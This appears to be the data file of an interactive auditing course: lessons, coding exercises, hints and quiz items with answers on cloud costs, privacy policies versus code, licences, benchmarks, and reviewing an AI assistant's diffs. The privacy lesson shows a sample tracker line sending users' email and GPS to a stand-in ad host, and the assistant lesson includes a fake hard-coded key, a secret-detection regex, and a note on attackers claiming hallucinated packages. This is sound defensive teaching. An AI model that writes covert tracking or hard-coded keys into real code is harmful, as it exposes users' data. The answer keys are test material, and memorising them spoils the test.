      code: 'function costOver(used, free, price) {\n  return Math.max(0, used - free) * price\n}\n\nconst dataOut = costOver(180, 100, 0.09)\nconsole.log("Data out: $" + dataOut.toFixed(2))\nconsole.log("Small month: $" + costOver(60, 100, 0.09).toFixed(2))',
      steps: [
        { line: 1, note: 'One function works for every unit: how much you used, how much is free, the price per unit.' },
        { line: 2, note: '`used - free` is the billable part. `Math.max(0, …)` stops it going negative when you\'re under the free limit.' },
        { line: 5, note: '180 GB out, 100 free: 80 billable × $0.09.' },
        { line: 6, note: '`toFixed(2)` rounds to cents and gives back a string: `Data out: $7.20`. (The raw number is 7.199999999999999, a normal floating-point wobble.)' },
        { line: 7, note: 'Under the free limit: `Small month: $0.00`. Without Math.max it would be -3.60.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "`usage.json` holds TrailPost's month on CloudCairn: requests, storage (GB) and data out (GB). Using the pricing above:\n1. Finish `costOver(used, free, price)`\n2. Print each line of the bill, then the total, then the bill at **10× traffic** (10× the requests and data out; storage stays the same)\n\nRequests are priced per **million**, so divide the request count by 1,000,000 first.\n\nExpected output:\n`Requests: $0.88`\n`Storage: $0.14`\n`Data out: $7.20`\n`Total: $8.22 per month`\n`At 10x traffic: $165.54 per month`",
      starter: 'const fs = require("fs")\nconst usage = JSON.parse(fs.readFileSync("usage.json", "utf8"))\n\nfunction costOver(used, free, price) {\n  // the part above the free allowance, times the price (never below 0)\n}\n\nfunction bill(requests, storageGB, egressGB) {\n  const r = costOver(requests / 1000000, 1, 0.40)\n  // storage: 5 GB free, $0.02 per GB\n  // data out: 100 GB free, $0.09 per GB\n  return { r }\n}\n\nconst now = bill(usage.requests, usage.storageGB, usage.egressGB)\nconsole.log("Requests: $" + now.r.toFixed(2))\n// print Storage, Data out, Total ... per month, then At 10x traffic ...\n',
      files: { 'usage.json': '{\n  "requests": 3200000,\n  "storageGB": 12,\n  "egressGB": 180\n}\n' },
      expect: ['Requests: $0.88', 'Storage: $0.14', 'Data out: $7.20', 'Total: $8.22 per month', 'At 10x traffic: $165.54 per month'],
      checks: [
        { expr: 'costOver(50, 100, 0.09)', equals: 0, label: 'Under the free allowance costs 0' },
        { expr: 'costOver(3, 1, 2)', equals: 4, label: 'costOver(3, 1, 2) is 4' },
      ],
      hints: ['`return Math.max(0, used - free) * price`', 'In bill: `const s = costOver(storageGB, 5, 0.02)` and `const e = costOver(egressGB, 100, 0.09)`, then `return { r, s, e, total: r + s + e }`.', 'For 10×: `const big = bill(usage.requests * 10, usage.storageGB, usage.egressGB * 10)`, then print `big.total.toFixed(2)`.'],
    },
    mistakes: [
      { wrong: 'return (used - free) * price', result: 'costOver(50, 100, 0.09) → -4.5', why: 'Below the free line you\'d get a negative cost. Wrap it: `Math.max(0, used - free) * price`.' },
      { wrong: 'costOver(3200000, 1, 0.40)', result: '1279999.6', why: 'The price is per **million** requests. Convert first: `3200000 / 1000000` is 3.2.' },
      { wrong: 'console.log("Total: $" + total)', result: 'Total: $8.219999999999999', why: 'Decimal money in floating point wobbles. Round for display with `toFixed(2)`.' },
    ],
    recap: [
      'List every billable unit: requests, compute, storage, **data out**, seats, builds, emails, AI tokens.',
      '`cost = max(0, used − free) × price`, per unit, then add them up.',
      'Always price the **10×** scenario: free tiers make bills jump.',
      'Hidden costs: data out, overages, pausing free tiers, per-seat pricing, paid-only backups or export, your time, lock-in.',
      'Set a budget alert or spending cap before launch.',
    ],
    questions: [
      { concept: 'cost-analysis', kind: 'mc', q: 'A podcast player\'s month on CloudCairn: 2.2M requests, 9 GB stored, 300 GB data out. Using the pricing from this trail, which line of the bill is biggest?', options: ['Requests', 'Storage', 'Data out', 'They\'re equal'], answer: 2, why: 'Data out: (300 − 100) × $0.09 = $18.00. Requests: (2.2 − 1) × $0.40 = $0.48. Storage: (9 − 5) × $0.02 = $0.08.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Traffic grew 10×, but the bill grew about 20×. Why?', options: ['Providers add a surcharge for spikes, roughly doubling the unit price', 'The free allowance is fixed, so nearly all the extra use is billable', 'Storage grew 10× as well, and storage costs more than traffic', 'Prices rise for every account that passes the free tier each month'], answer: 1, why: 'Below the free line you pay nothing; above it you pay for every unit. Growth crosses the line hard, so the bill jumps faster than traffic.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'A host\'s plan says "unlimited bandwidth". What do you check?', options: ['Nothing: the word unlimited legally binds them to serve any amount', 'The terms: usually a fair-use limit, then throttling or charges', 'Only the price, since unlimited plans are always cheaper per GB', 'Only the speed, since unlimited just means faster than limited'], answer: 1, why: '"Unlimited" is a claim. The terms are the evidence, and they usually set a fair-use limit.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Which is a HIDDEN cost an auditor should list?', options: ['The price per extra request, listed right in the pricing table', 'Data export only on the paid plan, so leaving costs money', 'The monthly price, shown in large type at the top', 'The free allowance of 1M requests, printed by each plan'], answer: 1, why: 'Exit cost never appears in the pricing table, but it decides whether you can ever leave (lock-in).' },
      { concept: 'cost-analysis', kind: 'mc', q: 'A bug in a bus timetable app calls a paid API in an endless loop all night. What would have limited the damage?', options: ['A bigger free tier, so the looping calls stay inside the allowance', 'A budget alert or spending cap set before launch', 'More detailed logging, so the loop shows up in the morning logs', 'Rotating the API key monthly, so an old key can\'t be used forever'], answer: 1, why: 'A cap or alert stops a runaway loop while it runs. Logs only explain the bill afterwards.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Service A costs $3 a month more than B but saves you about a day of maintenance every month. Which is cheaper in practice?', options: ['B, because $3 is real money and your own time costs nothing', 'A, because your time is a real cost too', 'Equal, because $3 matches the value of one day\'s work', 'Neither: maintenance time can\'t be priced or compared'], answer: 1, why: 'Total cost includes your hours, not just the invoice.' },
    ],
  },

  // ───────────────────────────── Trail 5 ─────────────────────────────
  {
    id: 'K-5', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Privacy and licences',
    teaches: ['privacy-audit', 'license-check'],
    idea: [
      { h: 'Two checks: privacy and licences', b: "Every audit must answer two questions about things that belong to other people.\n\n**Privacy:** the users' data. What's collected, where does it go, how long is it kept, and does that match what the project promises?\n\n**Licences:** other people's code. Are you actually allowed to use it the way you plan? \"It's on a public repo\" is not permission." },
      { h: 'What you will do', b: "Read the two cards, then go back into TrailPost: compare its privacy policy with what its code really does, and check the licences of the project and its dependencies. (Licence facts here are general education, not legal advice.)" },
    ],
    example: {
      intro: 'Policy vs code, and a licence surprise. Tap through it.',
      lang: 'sh',
      code: '$ cat PRIVACY.md\nWe collect nothing. Your trips stay on your device.\n$ cat src/analytics.js\nconst TRACKER = "https://collect.adwhale.example/v2/event"\n    body: JSON.stringify({ email: user.email, gps: user.lastLocation, event })\n$ cat node_modules/trail-maps/package.json\n  "license": "AGPL-3.0-only"\n$ cat node_modules/trail-utils/package.json\n  "license": "UNLICENSED"',
      steps: [
        { line: 1, note: 'The privacy policy is a claim. Read it first, then go find evidence.' },
        { line: 2, note: '"We collect nothing."' },
        { line: 3, note: 'Now the evidence: what does the code actually send? (Lines trimmed.)' },
        { line: 4, note: 'An outside domain, run by an advertising company.' },
        { line: 5, note: 'Email and GPS location go there. The policy claim is **contradicted**.' },
        { line: 6, note: 'Each installed package keeps its own package.json in node_modules, with its licence.' },
        { line: 7, note: 'AGPL: network copyleft. A web app that modifies this must offer users the source.' },
        { line: 9, note: '"UNLICENSED" means proprietary: no permission to use it at all. Not to be confused with "Unlicense".' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Check TrailPost's privacy promise and its licences:\n1. `cd trailpost`\n2. `cat PRIVACY.md` (the claims)\n3. `cat src/analytics.js` (what the code really sends, and to whom)\n4. `cat LICENSE` (the project's own licence)\n5. `ls node_modules` to list the installed dependencies\n6. `cat node_modules/trail-maps/package.json` and check its licence\n7. Record it:\n`echo \"MEDIUM: trail-maps is AGPL-3.0, check before modifying\" >> ~/audit-notes.txt`",
      seed: TRAILPOST,
      keys: ['cd ', 'cat ', 'ls ', 'echo ', 'trailpost', 'PRIVACY.md', 'src/analytics.js', 'LICENSE', 'node_modules', 'node_modules/trail-maps/package.json', ' >> ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^cat PRIVACY\\.md$', label: 'Read the privacy claims' },
        { kind: 'cmd', re: '^cat src/analytics\\.js$', label: 'Read what the analytics code sends' },
        { kind: 'cmd', re: '^cat LICENSE$', label: 'Read the project\'s licence' },
        { kind: 'cmd', re: '^ls node_modules/?$', label: 'List the dependencies in `node_modules`' },
        { kind: 'cmd', re: '^cat node_modules/trail-maps/package\\.json$', label: 'Check trail-maps\' licence' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: 'AGPL', label: 'An AGPL finding is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'Finding: "Privacy: OK (the policy says they collect nothing)."', result: '(src/analytics.js sends email and GPS to an ad company)', why: 'The policy is a claim. The code is the evidence. Always check both.' },
      { wrong: 'Finding: "Licence: MIT, so everything is fine to use."', result: '(trail-maps is AGPL, trail-utils is UNLICENSED)', why: 'The project\'s own licence doesn\'t cover its dependencies. Check every one.' },
      { wrong: 'Finding: "trail-utils: UNLICENSED, no restrictions."', result: '(the opposite: proprietary, no permission)', why: '`UNLICENSED` = all rights reserved. The public-domain-style one is `Unlicense`, without the D.' },
    ],
    recap: [
      '**Privacy audit**: a data inventory: what, why, where stored, sent to whom, kept how long, can users delete it.',
      'The privacy policy is a claim; code, logs and network requests are the evidence.',
      '**Licences**: permissive (MIT, ISC, BSD, Apache-2.0), weak copyleft (LGPL, MPL), strong copyleft (GPL), network copyleft (AGPL), source-available (restricted).',
      'No licence = no permission. `UNLICENSED` = proprietary. Check every dependency, not just the project.',
      'This is education, not legal advice: for real business decisions, ask a lawyer.',
    ],
    questions: [
      { concept: 'privacy-audit', kind: 'mc', q: 'Which is the strongest evidence of where a wedding RSVP site sends guests\' data?', options: ['The privacy policy, a legal document the site can be held to', 'The code\'s requests to outside domains, and the live network tab', 'The app store listing, which names the data that gets shared', 'A promise from the founder in the README not to share data'], answer: 1, why: 'Policies, listings and promises are claims. The requests the code really makes are the evidence.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'A privacy policy says: "Server logs are kept for 10 years to improve the service." What\'s the finding?', options: ['None: logs only record technical events, so long retention is harmless', 'A finding: logs hold IP addresses, and nothing needs 10 years. Ask for a limit', 'Fine: ten years is the period regulators require for all server logs', 'Only a problem if the logs are public, so the period isn\'t worth noting'], answer: 1, why: 'Keeping data longer than any stated need only adds to what can leak, and logs often hold IP addresses.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'Why isn\'t a GPS track "anonymous" just because the name was removed?', options: ['It is anonymous: with no name on it, nobody can tell whose it is', 'Where someone sleeps and works every day identifies them', 'GPS files are always encrypted, so nobody can read the places', 'The phone model in the file is what identifies a person, not GPS'], answer: 1, why: 'Location patterns re-identify people easily: the same house every night, the same office every day.' },
      { concept: 'license-check', kind: 'mc', q: 'A repo has great code and no licence file at all. May you copy its code into your app?', options: ['Yes: posting code publicly means the author accepts reuse', 'No: without a licence, all rights are reserved', 'Yes, if you credit the author, since credit is all they can ask', 'Only for non-commercial projects, which need no licence'], answer: 1, why: 'Public isn\'t permission. No licence means no right to reuse.' },
      { concept: 'license-check', kind: 'mc', q: 'Which licence family lets you use the code in a closed-source paid product, as long as you keep the notice?', options: ['Copyleft (GPL-2.0, GPL-3.0, AGPL-3.0)', 'Network copyleft (AGPL-3.0, SSPL-1.0)', 'Permissive (MIT, ISC, BSD, Apache-2.0)', 'Unlicensed (UNLICENSED, no LICENSE file)'], answer: 2, why: 'Permissive licences ask little beyond keeping the copyright and licence notice.' },
      { concept: 'license-check', kind: 'mc', q: 'Your web app uses a MODIFIED AGPL-3.0 library, and users reach the app over the internet. What does AGPL ask of you?', options: ['Nothing, since you never gave anyone a copy; it runs on your server', 'Offer those users the source code of the modified program', 'Pay the author a licence fee, since AGPL is for commercial use', 'Take the app off the internet, since AGPL allows only private use'], answer: 1, why: 'AGPL closes the server gap: network users of a modified version get the right to its source.' },
      { concept: 'license-check', kind: 'mc', q: 'A project\'s code is public, but its licence says "free except for offering it as a hosted service". What kind is that?', options: ['Permissive open source: a hosting limit is a normal condition', 'Source-available: you can read it, but use is restricted', 'Public domain, with one small exception for hosting firms', 'GPL: public code that must be shared again when hosted'], answer: 1, why: 'Visible code isn\'t automatically open source. Restrictions on use make it source-available: read the actual terms.' },
      { concept: 'license-check', kind: 'mc', q: 'Does the GPL forbid selling software?', options: ['Yes: GPL code must be given away free, and any fee breaks the licence', 'No: you may sell it, but you must provide the source when you ship it', 'Only sales to businesses are banned; giving copies away is allowed', 'Yes, unless you first get the original authors\' written permission'], answer: 1, why: 'The GPL is about sharing source when you distribute, not about price.' },
    ],
  },

  // ───────────────────────────── Trail 6 ─────────────────────────────
  {
    id: 'K-6', type: 'learn', mode: 'phone', xp: 35, mins: 50,
    title: 'Benchmarks, and writing the report',
    teaches: ['benchmark-skepticism', 'audit-report'],
    idea: [
      { h: 'Checking benchmarks and writing the report', b: "\"10× faster\" sounds convincing because it's a number. But which run, measured how, by whom? A benchmark that quotes only the single best run is like reporting a climber's fastest-ever time as their normal pace.\n\nThe last step is the **report**. An audit nobody can read changes nothing, so the report turns your evidence into a decision." },
      { h: 'Check the numbers yourself', b: "Read the two cards. Then you'll parse TrailPost's own `BENCHMARKS.md` in code, compute the **median** for both apps, and see what happens to the \"10× faster\" claim when you stop cherry-picking." },
    ],
    example: {
      intro: 'The median, the honest middle. Tap through it.',
      lang: 'js',
      code: 'function median(nums) {\n  const s = [...nums].sort((a, b) => a - b)\n  const mid = Math.floor(s.length / 2)\n  return s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2\n}\n\nconst runs = [410, 395, 22, 405, 400]\nconsole.log("best " + Math.min(...runs) + ", median " + median(runs))',
      steps: [
        { line: 1, note: 'The median: sort the numbers, take the middle one.' },
        { line: 2, note: '`[...nums]` copies the array first, so sorting doesn\'t change the original. `(a, b) => a - b` sorts as numbers; the default sort compares text.' },
        { line: 3, note: 'The middle index. For 5 items, `Math.floor(5 / 2)` is 2: the third item.' },
        { line: 4, note: 'Odd count: the middle item. Even count: the average of the two middle items.' },
        { line: 7, note: 'Five runs. One of them (22) is wildly faster: probably a cached request.' },
        { line: 8, note: '`Math.min(...runs)` spreads the array into separate numbers. Output: `best 22, median 400`. Same data, two very different stories.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "The sandbox has TrailPost's `BENCHMARKS.md`: five runs of trip load time (ms, lower is better) for TrailPost and RouteBook. The README claims **10× faster** using each app's best run.\n1. Finish `median(nums)` (sort as numbers!)\n2. The parsing is done. Print the best and median for each app, then compare\n\nExpected output:\n`trailpost: best 22 ms, median 400 ms`\n`routebook: best 220 ms, median 230 ms`\n`Best runs: trailpost 10.0x faster`\n`Medians: routebook 1.7x faster`",
      starter: 'const fs = require("fs")\nconst text = fs.readFileSync("BENCHMARKS.md", "utf8")\n\n// Table rows look like: | 1   | 410       | 220       |\nconst tp = [], rb = []\nfor (const line of text.split("\\n")) {\n  const cells = line.split("|").map(c => c.trim())\n  if (cells.length < 4 || isNaN(Number(cells[1])) || cells[1] === "") continue\n  tp.push(Number(cells[2]))\n  rb.push(Number(cells[3]))\n}\n\nfunction median(nums) {\n  // copy, sort as numbers, return the middle (or the average of the two middles)\n}\n\n// print the four lines\n// ratios: (220 / 22).toFixed(1) and (median of trailpost / median of routebook).toFixed(1)\n',
      files: { 'BENCHMARKS.md': '# TrailPost vs RouteBook: trip load time (ms, lower is better)\n\n| run | trailpost | routebook |\n|-----|-----------|-----------|\n| 1   | 410       | 220       |\n| 2   | 395       | 240       |\n| 3   | 22        | 230       |\n| 4   | 405       | 235       |\n| 5   | 400       | 225       |\n\nResult: TrailPost is 10x faster (22 ms vs 220 ms)!\n' },
      expect: ['trailpost: best 22 ms, median 400 ms', 'routebook: best 220 ms, median 230 ms', 'Best runs: trailpost 10.0x faster', 'Medians: routebook 1.7x faster'],
      checks: [
        { expr: 'median([10, 9, 100])', equals: 10, label: 'median sorts as numbers' },
        { expr: 'median([5, 1, 9, 7])', equals: 6, label: 'median of an even count averages the middle two' },
      ],
      hints: ['`const s = [...nums].sort((a, b) => a - b)` then `const mid = Math.floor(s.length / 2)`.', '`return s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2`', 'Best is `Math.min(...tp)`. Line 3: `"Best runs: trailpost " + (Math.min(...rb) / Math.min(...tp)).toFixed(1) + "x faster"`. Line 4: `"Medians: routebook " + (median(tp) / median(rb)).toFixed(1) + "x faster"`.'],
    },
    mistakes: [
      { wrong: 'const s = nums.sort()', result: 'median([10, 9, 100]) → 100', why: 'The default sort compares as text, so "100" comes before "9". Sort numbers with `(a, b) => a - b`.' },
      { wrong: 'Using the average: (410 + 395 + 22 + 405 + 400) / 5', result: '326.4', why: 'One cached 22 ms run drags the average far below what users normally see. The median (400) isn\'t fooled.' },
      { wrong: 'Report summary on the last page, after 12 pages of findings', result: '(the reader never reaches the verdict)', why: 'Bottom line up front: verdict and top findings first.' },
    ],
    recap: [
      'Ask of every benchmark: what was measured, by whom, same conditions, how many runs, which run is shown, warm or cold?',
      'Quote the **median** (and **p95**), not the best run. Sort numbers with `(a, b) => a - b`.',
      'Best of all, measure it yourself with your own data.',
      '**Report**: title and version, summary (verdict first), scope and method, findings (severity, evidence, impact, fix), positives, verdict.',
      'Mask secrets in reports, and disclose security problems privately to maintainers first.',
    ],
    questions: [
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'A to-do app\'s launch post quotes only each tool\'s single fastest run. What\'s that called?', options: ['Load testing', 'Cherry-picking', 'Caching', 'Profiling'], answer: 1, why: 'Choosing only the results that support your story is cherry-picking.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'One run took 22 ms; the other four took about 400 ms. What probably happened?', options: ['The browser optimised the code after one run, so 22 ms is the new normal', 'That request was served from a cache: a warm run', 'The timer was wrong, since timers can\'t measure below 50 ms', 'The testing tool slowed four runs, so 22 ms is the true time'], answer: 1, why: 'Repeated requests often hit a cache and look impossibly fast. Real users often hit the cold path.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'What does this log?', code: 'function median(nums) {\n  const s = [...nums].sort((a, b) => a - b)\n  const mid = Math.floor(s.length / 2)\n  return s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2\n}\nconsole.log(median([300, 20, 310, 290]))', options: ['295', '230', '165', '300'], answer: 0, why: 'Sorted: 20, 290, 300, 310. With four values it averages the middle two: (290 + 300) / 2 = 295. The mean, 230, is dragged down by the one 20 ms run.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'What does "p95 = 300 ms" mean?', options: ['95% of requests took exactly 300 ms', '95% of requests took less than 300 ms', 'The slowest 5% averaged 300 ms each', 'The app answered 95% of requests'], answer: 1, why: 'p95 is the line 95% of requests come in under. It shows what your slower regular users feel.' },
      { concept: 'audit-report', kind: 'mc', q: 'What goes FIRST in an audit report?', options: ['The full list of commands you ran, so readers can repeat them', 'A summary with the verdict and the top findings', 'The findings in the order you found them, like a story', 'A glossary of terms, so non-technical readers can follow'], answer: 1, why: 'Bottom line up front: many readers stop after the summary.' },
      { concept: 'audit-report', kind: 'mc', q: 'Which parts does every finding need?', options: ['A title, a date and the name of the person who found it', 'Severity, evidence, impact and a fix', 'Severity, a screenshot and the file author\'s name', 'Only a severity and a title, to keep it scannable'], answer: 1, why: 'Evidence makes it checkable, impact makes it understandable, and the fix makes it actionable.' },
      { concept: 'audit-report', kind: 'mc', q: 'You find a live password in someone\'s public project. What\'s the responsible move?', options: ['Post a redacted screenshot publicly, so everyone is warned at once', 'Report it privately to the maintainers (see SECURITY.md) and mask it', 'Log in once to confirm it still works, then report it as a live leak', 'Leave it: a leak in someone else\'s project isn\'t your problem'], answer: 1, why: 'Responsible disclosure: tell them privately, give them time to fix it, and never use or spread the secret.' },
    ],
  },

  // ───────────────────────────── Trail 7 (id K-14, added later): working with an AI coding assistant ─────────────────────────────
  {
    id: 'K-14', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Working with an AI coding assistant',
    teaches: ['ai-coding-assistant', 'reviewing-ai-code', 'package-hallucination'],
    uses: ['git-diff', 'git-restore', 'dependency-audit', 'secret-scan', 'edge-cases'],
    idea: [
      { h: 'It writes fast. You still answer for what ships.', b: "An **AI coding assistant** (also called a **coding agent**) reads your project and writes or changes code from your description. It is quick, and it is often right. It is also just as confident when it is wrong. It can invent a function that doesn't exist, use an old version of a library, or write code that handles the one example you gave and breaks on the next input.\n\nSo the skill is not typing prompts. It is **checking the result**. The rule for this trail: nothing the assistant wrote counts until you have read it and run it. That is the audit method you learned in this camp, aimed at code you did not write yourself." },
      { h: 'Before you start, and when to stop', b: "Do three things before each session: **commit** your work so you can roll back, give a **brief** (what you want, the limits, which files, how you'll know it's done), and keep secrets out of what you paste. Ask for **small changes**, one at a time.\n\nKnow when to stop. If you've asked three times and it keeps going in circles, or the fix is one line you already understand, do it yourself. Never ship code you can't explain." },
    ],
    example: {
      intro: 'You asked an assistant to turn trip names into URL slugs. Here is the check you do afterwards. Tap through it.',
      lang: 'sh',
      code: "$ git commit -am \"Checkpoint before the assistant works\"\n$ git diff --stat\n package.json        | 1 +\n src/server.js       | 6 +++++-\n test/server.test.js | 6 ------\n 3 files changed, 6 insertions(+), 7 deletions(-)\n$ git diff test/server.test.js\n-test('rejects a missing name', () => {\n-  expect(() => addTrip({})).toThrow()\n-})\n$ npm test",
      steps: [
        { line: 1, note: 'This ran **before** the assistant started. Now every change it makes can be undone: `git restore .` throws away all uncommitted edits to tracked files.' },
        { line: 2, note: 'After it finished, look at **which files changed** before you read a single line. `--stat` is a summary.' },
        { line: 3, note: 'A new line in `package.json`: a new dependency. You asked for a slug, so check that package carefully.' },
        { line: 4, note: '`src/server.js` is where you expected changes: five lines added, one removed.' },
        { line: 5, note: 'The test file shows **six lines removed and none added**. The assistant did not touch the tests you asked it to leave alone. It deleted some.' },
        { line: 6, note: 'The totals. Deleted lines matter as much as added ones.' },
        { line: 7, note: 'Read the diff of the suspicious file. (Git prints a few header lines first, left out here.)' },
        { line: 8, note: 'A whole test is gone: the one that checks a missing name is rejected. A change that deletes the test for a bug is not a fix.' },
        { line: 11, note: 'Then run the tests yourself, and use the app by hand. "All tests pass" means little when the failing tests were deleted. Compare the number of tests with the number before.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "An assistant made a change. The sandbox has its change as a diff (`change.diff`, the way `git diff` prints it) and the project's `package.json`. Finish the reviewer script. A diff line starting with `+` was added, and one starting with `-` was removed. Lines starting with `+++` or `---` are file headers, not changes.\n\n1. `removedTest(line)`: true for a removed test line: it starts with `-`, then optional spaces, then `test(` or `it(`\n2. `hasSecret(line)`: true for an **added** line that matches `SECRET` (a hard-coded key, token or password)\n3. `unknownPackage(line)`: for an **added** line with `require('name')`, return the name when it is not relative (doesn't start with `.`), not in `BUILTIN` and not in `deps`. Otherwise return `null`\n4. In the loop, print one line per problem, using the line number `n`, and count it\n\nExpected output:\n`Line 7: package not in package.json: slugify-pro`\n`Line 10: possible hard-coded secret`\n`Line 24: a test was removed`\n`Line 27: a test was removed`\n`4 problems found`",
      starter: "const fs = require('fs')\n\nconst pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'))\nconst deps = Object.keys(pkg.dependencies)\nconst BUILTIN = ['fs', 'path', 'http', 'os', 'crypto']\nconst SECRET = /(key|secret|token|password)\\w*\\s*=\\s*[\"'][^\"']{6,}[\"']/i\n\n// true for a removed test line: \"-\", optional spaces, then test( or it(\nfunction removedTest(line) {\n}\n\n// true for an ADDED line (starts with \"+\" but not \"+++\") that matches SECRET\nfunction hasSecret(line) {\n}\n\n// for an ADDED line with require('name'): the name if it is not relative,\n// not built in and not in deps. Otherwise null\nfunction unknownPackage(line) {\n}\n\nconst lines = fs.readFileSync('change.diff', 'utf8').split('\\n')\nlet problems = 0\nlines.forEach((line, i) => {\n  const n = i + 1\n  // print one of these for each problem, and add 1 to problems:\n  //   Line 7: package not in package.json: slugify-pro\n  //   Line 10: possible hard-coded secret\n  //   Line 24: a test was removed\n})\nconsole.log(problems + ' problems found')\n",
      files: {
        'package.json': '{\n  "name": "trailpost",\n  "dependencies": {\n    "dayjs": "^1.11.13",\n    "express": "^4.18.2"\n  }\n}\n',
        'change.diff': ['diff --git a/src/server.js b/src/server.js', '--- a/src/server.js', '+++ b/src/server.js', '@@ -1,6 +1,11 @@', " const express = require('express')", "+const dayjs = require('dayjs')", "+const slugify = require('slugify-pro')", "+const db = require('./db')", ' const app = express()', "+const API_KEY = 'trail-8841-live-key'", '+const PORT = process.env.PORT || 3000', ' ', " app.get('/trips', (req, res) => {", '-  res.json(loadTrips())', '+  res.json(loadTrips().map(t => slugify(t.name)))', ' })', 'diff --git a/test/server.test.js b/test/server.test.js', '--- a/test/server.test.js', '+++ b/test/server.test.js', '@@ -4,9 +4,6 @@', " test('health answers ok', () => {", "   expect(health()).toBe('ok')", ' })', "-test('returns an empty list when there are no trips', () => {", '-  expect(loadTrips()).toEqual([])', '-})', "-test('rejects a missing name', () => {", '-  expect(() => addTrip({})).toThrow()', '-})', ''].join('\n'),
      },
      expect: ['Line 7: package not in package.json: slugify-pro', 'Line 10: possible hard-coded secret', 'Line 24: a test was removed', 'Line 27: a test was removed', '4 problems found'],
      checks: [
        { expr: "removedTest(\"-test('a', () => {\")", equals: true, label: 'a removed test line is flagged' },
        { expr: "removedTest(\"+test('a', () => {\")", equals: false, label: 'an added test line is fine' },
        { expr: "hasSecret(\"+const token = 'abcdef123'\")", equals: true, label: 'an added secret is flagged' },
        { expr: "hasSecret(\"-const token = 'abcdef123'\")", equals: false, label: 'a removed secret is not flagged' },
        { expr: "unknownPackage(\"+const x = require('left-padder')\")", equals: 'left-padder', label: 'an unknown package is named' },
        { expr: "unknownPackage(\"+const x = require('express')\")", equals: null, label: 'a package in package.json is fine' },
      ],
      hints: [
        "`return /^-\\s*(test|it)\\(/.test(line)` checks a removed test. For a secret: `return line.startsWith('+') && !line.startsWith('+++') && SECRET.test(line)`.",
        "For packages: `if (!line.startsWith('+') || line.startsWith('+++')) return null`, then `const m = line.match(/require\\(['\"]([^'\"]+)['\"]\\)/)`. If there's no match, return null. The name is `m[1]`.",
        "Return null when `name.startsWith('.')`, `BUILTIN.includes(name)` or `deps.includes(name)`. Otherwise return `name`.",
        "In the loop: `if (removedTest(line)) { console.log('Line ' + n + ': a test was removed'); problems++ } else if (hasSecret(line)) { … } else { const name = unknownPackage(line); if (name) { … } }`.",
      ],
    },
    mistakes: [
      { wrong: "$ npm install slugify-pro   (copied from the assistant's code)", result: 'npm error 404 Not Found - GET https://registry.npmjs.org/slugify-pro - Not found', why: 'The assistant made the name up. Look a package up with `npm view <name>` before installing it. If a name does exist, anyone could have published it, so check its age, maintainer and repository.' },
      { wrong: 'items.sortBy(i => i.name)', result: 'TypeError: items.sortBy is not a function', why: 'Arrays have no `sortBy` method. The assistant mixed up a library function with a built-in one. Run the code and read the error: an invented method fails at once.' },
      { wrong: '-  expect(total([1, 2, 3])).toBe(6)\n+  expect(total([1, 2, 3])).toBeTruthy()', result: '(the test passes whatever total returns, even 0 or 7)', why: 'The assistant weakened a failing test instead of fixing the code. Read test changes as closely as code changes.' },
      { wrong: 'Pasting your whole .env file into the chat to get help', result: '(your real keys now sit on another company\'s servers)', why: 'Replace values with placeholders such as `API_KEY=<redacted>` first. If a real key was pasted, treat it as leaked: revoke it and make a new one.' },
    ],
    recap: [
      'A good **brief** has a goal, the constraints, the files, what done looks like and how to test it. Ask for **small changes**, one at a time.',
      '**Commit before** you start so you can roll back (`git restore .`). Keep **secrets out of prompts**: paste placeholders, never real keys.',
      '**Read the diff:** `git diff --stat` first to see which files changed, then every changed line, deleted ones included. Anything you did not ask for needs an explanation.',
      '**Verify yourself:** run the tests and the app, and try edge cases. "Done" and "all tests pass" are claims, not evidence.',
      'Common failures: **invented functions and packages**, outdated APIs, code that passes the example but fails other inputs, deleted or weakened tests, hard-coded secrets.',
      '**Package hallucination:** an invented package name can be claimed by an attacker, and install scripts run on your machine. Look a package up first (`npm view`) and prefer well-known ones. Stop and do it yourself when you are going in circles or can\'t explain the code.',
    ],
    questions: [
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'Which brief gives an assistant the best chance of making a change you can check?', options: ['"Add a slug function somewhere sensible for the recipe planner, use any package you like, and tell me when it\'s done."', '"Add slug(name) in src/slug.js. No new packages. slug(\'Hi There\') must return \'hi-there\'. I\'ll run npm test."', '"Add slug(name) in src/slug.js, and while you\'re in there, rewrite the other helpers so the whole folder is cleaner."', '"Make the recipe URLs nicer. You know this code better than I do, so do whatever you think is best and say when."'], answer: 1, why: 'It names the file, a limit, a concrete input and output, and the test you\'ll run. The others leave out the limit or the done check, or ask for extra changes nobody can review.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'You\'re about to let an assistant change many files. What\'s the safest first step?', options: ['Turn off your tests, so they can\'t slow it down', 'Commit your current work, so you can roll back', 'Copy your .env into the chat, so it has full context', 'Ask for the whole feature in one go, to save time'], answer: 1, why: 'A commit gives you a clean point to return to. `git restore .` then undoes its uncommitted edits to tracked files.' },
